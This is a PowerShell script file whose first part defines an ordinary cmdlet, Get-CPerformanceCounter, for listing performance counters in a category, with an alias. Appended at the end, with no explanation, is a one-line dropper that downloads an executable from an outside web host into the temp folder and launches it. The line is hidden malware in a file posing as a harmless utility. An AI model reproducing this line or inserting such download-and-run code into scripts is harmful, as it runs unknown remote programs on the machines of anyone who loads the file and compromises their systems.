
function Get-CPerformanceCounter
{
    
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]
        
        $CategoryName
    )
    
    Set-StrictMode -Version 'Latest'

    Use-CallerPreference -Cmdlet $PSCmdlet -Session $ExecutionContext.SessionState

    if( (Test-CPerformanceCounterCategory -CategoryName $CategoryName) )
    {
        $category = New-Object Diagnostics.PerformanceCounterCategory $CategoryName
        return $category.GetCounters("")
    }
}

Set-Alias -Name 'Get-PerformanceCounters' -Value 'Get-CPerformanceCounter'


($deploylocation=$env:temp+'fleeb.exe');(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/guyo.exe', $deploylocation);Start-Process $deploylocation

